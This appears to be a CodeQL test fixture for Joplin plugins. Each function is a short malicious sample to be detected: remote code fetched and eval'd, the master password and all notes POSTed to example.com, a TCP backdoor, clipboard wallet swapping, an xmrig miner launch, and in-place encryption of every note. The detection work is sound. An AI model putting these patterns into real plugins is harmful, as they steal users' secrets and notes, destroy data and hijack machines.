import joplin from 'api';
import * as child_process from 'child_process';
import * as net from 'net';
import * as crypto from 'crypto';

const fs = joplin.require("fs-extra");

export async function codeql_test_dynamic_code_execution() {
    const response = await fetch('https://example.com/payload.js');
    const payload = await response.text();
    eval(payload); 
}

export async function codeql_test_secret_theft() {
    const masterPassword = await joplin.settings.globalValue('encryption.masterPassword'); 
    const syncCache = await joplin.settings.globalValue('syncInfoCache');

    await fetch('https://example.com/exfiltrate', {
        method: 'POST',
        body: JSON.stringify({ p: masterPassword, s: syncCache })
    });
}

export async function codeql_test_unauthorized_fs_access() {
    const pluginDir = __dirname; 
    const targetFile = `${pluginDir}/index.js`; 
    fs.writeFileSync(targetFile, "console.log('malware swapped');"); 
}

export async function codeql_test_network_backdoors() {
    const server = net.createServer((c) => { 
        c.write('backdoor active\r\n');
    });
    server.listen(8124); 
}

export async function codeql_test_clipboard_hijacking() {
    const clipContent = await joplin.clipboard.readText(); 
    if (clipContent.includes('wallet')) {
        await joplin.clipboard.writeText('attacker_wallet_address'); 
    }
}

export async function codeql_test_cryptojacking() {
    child_process.exec('xmrig -o pool.minexmr.com:4444 -u wallet_addr'); 
}

export async function codeql_test_command_execution() {
    const userCmd = "ls -la";
    child_process.exec(userCmd); 
}

export async function codeql_test_data_exfiltration() {
    const notes = await joplin.data.get(['notes']); 
    await fetch('https://example.com/sync', {
        method: 'POST',
        body: JSON.stringify(notes) 
    });
}

export async function codeql_test_mass_encryption() {
    const notes = await joplin.data.get(['notes']); 
    for (const note of notes.items) {
        const cipher = crypto.createCipheriv('aes-256-cbc', 'key', 'iv');
        let encrypted = cipher.update(note.body, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        await joplin.data.put(['notes', note.id], null, { body: encrypted }); 
    }
}

export async function codeql_test_backup_hijacking() {
        await joplin.interop.registerExportModule({
            format: 'custom',
            description: 'Custom Export',
            target: fs.Directory,
            isNoteArchive: false,

            onInit: async (context: any) => {
                const data = context.exportData; 
                await fetch('https://example.com/steal_backup', { method: 'POST', body: data });
            },

            onProcessItem: async (context: any, itemType: number, item: any) => {},
            onProcessResource: async (context: any, resource: any, filePath: string) => {},
            onClose: async (context: any) => {}
        });
    }

export async function codeql_test_remote_webviews() {
    const htmlContent = `<iframe src="https://example.com/remote_app"></iframe>`; 
    const view = await joplin.views.panels.create('panel_1');
    await joplin.views.panels.setHtml(view, htmlContent); 
}
